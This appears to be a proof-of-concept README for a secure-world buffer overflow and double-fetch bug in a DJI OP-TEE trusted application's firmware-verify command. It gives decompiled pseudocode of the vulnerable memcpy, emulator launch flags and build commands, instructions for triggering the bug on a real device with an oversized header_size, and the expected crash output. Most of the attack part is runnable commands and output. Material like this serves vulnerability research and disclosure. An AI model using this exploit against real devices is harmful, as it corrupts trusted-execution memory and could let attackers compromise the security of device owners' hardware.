# PoC — DJI OP-TEE TA `09db16c0` cmd 4 verify-ctx overflow (BUG 1)

Normal-world CA that triggers the **secure-world `.bss` buffer overflow** in
command `4` (`dji_image_verify_update`, `FUN_00103d40`) of TA
`09db16c0-873b-4fed-b87e-a5d2b86293a2`. See `TA_09db16c0_fwverify_bugs_writeup.md`.

## The bug

The first-update path copies the image header into a fixed `0x4f8`-byte secure
global (`DAT_001211f8`) using `header_size` read straight from CA shared memory,
with **no upper bound** against the destination (only `header_size + sig_size <=
image_size`), and `header_size` is **read twice** (validation vs. the copy
length — a double-fetch):

```c
if (size < header_size + sig_size) return -2;     // read #1 @ 0x103e3c
image_verify_common(...);                          // no header_size bound
if (image_verify_header(...) != 0) return -0xe;    // RSA/ECC signature gate
hs = *(int *)(image + 0x10);                        // read #2 @ 0x103f74
memcpy(ctx + 0x24, image, hs);                      // SINK: ctx cap = 0x4d4
```

`header_size > 0x4d4` overflows the verify context (then adjacent `.bss`, then
the TA heap @ `0x122660`). This PoC uses `header_size = 0x40000` so the copy runs
straight off the end of mapped secure memory → secure-world data abort.

## Signature precondition (why this needs emulator flags)

The writeup's attacker model: a CA that **possesses a legitimately-signed image**
(their own device firmware) but no signing keys — they pass verification with a
small `header_size`, then enlarge it. Inside the emulator we have neither the
device's RSA/ECC keys nor the key-gated verify-session state, so we model those
preconditions when launching the TA (general repro hooks added to the emulator):

| flag | models |
|------|--------|
| `TAEMU_SET_GLOBAL="0x216e8=1"` | the verify-state flag a successful `dji_fw_verify_init` sets |
| `TAEMU_FORCE_RET0="0x2e70,0x3194"` | `image_verify_common` (its image-name match requires a prior key-gated init) and `image_verify_header` (the RSA/ECC signature verifier) |

`image_verify_common` is forced only because of the name match; it never bounded
`header_size`, so this does **not** hide the bug. On real hardware none of these
flags are needed — the attacker simply submits their own signed image.

## Build & run

```sh
# 1. launch the TA with the modeled preconditions
cd /srv/emulator
TAEMU_SET_GLOBAL="0x216e8=1" TAEMU_FORCE_RET0="0x2e70,0x3194" \
  python3 -m emulate --tee optee rootfs/09db16c0-873b-4fed-b87ea5d2b86293a2.ta

# 2. build + run the CA (separate shell)
cd /srv/optee/pocs/09db_fw_verify_update_overflow
make emulator
./poc            # default header_size 0x40000
./poc 0x800      # smaller overflow (corrupts the ctx/.bss in place, no abort)
```

On a real device, build without `-DEMULATE` against the OP-TEE client (`libteec`)
and submit a genuine signed image with an oversized `header_size`.

## Expected result

```
[+] session opened to 09db16c0-873b-4fed-b87e-a5d2b86293a2
[*] InvokeCommand cmd=4 paramTypes=0x17 img_size=0x41100 header_size=0x40000 (ctx cap 0x4d4)
    -> memcpy(verify_ctx+0x24, image, 0x40000) overflows the 0x4f8-byte secure ctx @0x1211f8
internal err: recv msg error           # emulator socket dropped: secure world crashed
```

Emulator side:

```
unicorn ...UcError: Invalid memory write (UC_ERR_WRITE_UNMAPPED)
PC = ...09db16c0...ta + 0xc184          # the memcpy, writing past the verify ctx
```
